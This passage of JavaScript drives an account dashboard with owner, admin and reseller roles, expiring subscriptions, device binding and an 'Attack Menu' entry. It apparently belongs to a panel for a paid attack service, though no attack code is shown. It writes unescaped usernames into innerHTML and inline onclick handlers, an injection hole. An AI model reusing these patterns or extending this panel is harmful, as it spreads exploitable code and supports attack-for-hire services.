  } catch (error) {
    console.error('Error clearing sessions:', error);
    showNotification('Failed to clear sessions', 'error');
  }
}

async function regenerateMasterToken() {
  if (currentUser?.role !== 'owner') return;
  
  const newToken = generateToken();
  
  try {
    const response = await fetch('/api/regenerate-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: newToken })
    });
    
    const result = await response.json();
    if (result.success) {
      showNotification('Master token regenerated', 'success');
    } else {
      showNotification(result.message || 'Failed to regenerate token', 'error');
    }
  } catch (error) {
    console.error('Error regenerating token:', error);
    showNotification('Failed to regenerate token', 'error');
  }
}

/* ========== USER LIST MANAGEMENT ========== */
async function loadUserList() {
  const userListBody = document.getElementById('userListBody');
  userListBody.innerHTML = '<tr><td colspan="5" class="loading-text"><i class="fas fa-circle-notch fa-spin"></i> Loading user data...</td></tr>';

  try {
    const users = await getUsers();
    
    if (users.length === 0) {
      userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No users found</td></tr>';
      return;
    }

    userListBody.innerHTML = '';
    users.forEach(user => {
      const row = document.createElement('tr');
      
      let actions = '';
      if (currentUser.role === 'owner' || (currentUser.role === 'admin' && user.role !== 'owner')) {
        actions = `
          <div class="action-menu">
            <button class="action-btn">
              <i class="fas fa-cog"></i>
            </button>
            <div class="action-menu-content">
              <a href="#" onclick="addDaysToUser('${user.username}'); return false;">
                <i class="fas fa-calendar-plus"></i> Add Days
              </a>
              ${currentUser.role === 'owner' ? `
              <a href="#" onclick="changeUserRole('${user.username}'); return false;">
                <i class="fas fa-user-tag"></i> Change Role
              </a>
              ` : ''}
              <a href="#" onclick="changeUsername('${user.username}'); return false;">
                <i class="fas fa-user-edit"></i> Change Username
              </a>
              <a href="#" onclick="changeUserPassword('${user.username}'); return false;">
                <i class="fas fa-key"></i> Change Password
              </a>
              <a href="#" onclick="resetDeviceId('${user.username}'); return false;">
                <i class="fas fa-mobile-alt"></i> Reset Device
              </a>
              <a href="#" onclick="deleteUser('${user.username}'); return false;" style="color: #f44336;">
                <i class="fas fa-trash"></i> Delete
              </a>
            </div>
          </div>
        `;
      }
      
      row.innerHTML = `
        <td>${user.username}</td>
        <td>
          <span class="role-badge ${user.role}">${user.role}</span>
        </td>
        <td>${user.expired || 'N/A'}</td>
        <td>${user.device_id ? user.device_id.substring(0, 6) + '...' : 'Not logged in'}</td>
        <td>${actions}</td>
      `;
      userListBody.appendChild(row);
    });
  } catch (error) {
    userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #f44336;">Error loading users</td></tr>';
  }
}

/* ========== DASHBOARD FUNCTIONS ========== */
function showDashboard() {
  if (!currentUser) return;
  
  header.classList.remove('hidden');
  userBadge.classList.remove('hidden');
  loginCard.classList.add('hidden');
  dashboard.classList.remove('hidden');
  
  // Update user info
  document.getElementById('infoUsername').textContent = currentUser.username;
  document.getElementById('infoRole').textContent = currentUser.role;
  document.getElementById('infoDeviceId').textContent = localDeviceId.substring(0, 8) + '...';
  document.getElementById('infoExpired').textContent = currentUser.expired || 'Never';
  
  // Update my info form
  document.getElementById('myInfoUsername').value = currentUser.username;
  document.getElementById('myInfoRole').value = currentUser.role;
  
  // Update role badge
  currentRole.textContent = currentUser.role;
  currentRole.className = `role-badge ${currentUser.role}`;
  
  // Update welcome message
  const welcomeMessages = {
    owner: `Welcome back, Owner!`,
    admin: `Admin Dashboard`,
    reseller: `Reseller Panel`,
    user: `User Dashboard`
  };
  
  document.getElementById('welcomeMessage').textContent = welcomeMessages[currentUser.role] || 'Welcome back!';
  
  // Check API status
  checkApiConnection();
  
  // Update side menu
  updateSideMenu();
  
  // Start session timer
  startInactivityTimer();
}

function updateSideMenu() {
  sideMenu.innerHTML = '';
  
  if (!currentUser) return;

  const menuItems = [
    { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') },
    { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
  ];

  if (currentUser.role === 'admin' || currentUser.role === 'reseller') {
    menuItems.push(
      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
      { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
    );
  }

  if (currentUser.role === 'owner') {
    menuItems.push(
      { icon: 'fa-crown', text: 'Owner Panel', action: () => showMenu('ownerPanel') }
    );
  }

  const statusItem = document.createElement('div');
  statusItem.className = 'menu-item';
  statusItem.innerHTML = '<i class="fas fa-plug"></i> <span id="apiStatus">Checking API...</span>';
  sideMenu.appendChild(statusItem);

  menuItems.forEach(item => {
    const menuItem = document.createElement('div');
    menuItem.className = 'menu-item';
    menuItem.innerHTML = `<i class="fas ${item.icon}"></i> ${item.text}`;
    menuItem.addEventListener('click', item.action);
    sideMenu.appendChild(menuItem);
  });

  const logoutItem = document.createElement('div');
  logoutItem.className = 'menu-item';
  logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
  logoutItem.addEventListener('click', logout);
  logoutItem.style.marginTop = '20px';
  logoutItem.style.color = '#f44336';
  sideMenu.appendChild(logoutItem);
}

/* Helper functions for UI feedback */
function showError(element, message) {
  element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
  element.style.color = '#f44336';
}

function showSuccess(element, message) {
  element.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
  element.style.color = 'var(--main)';
}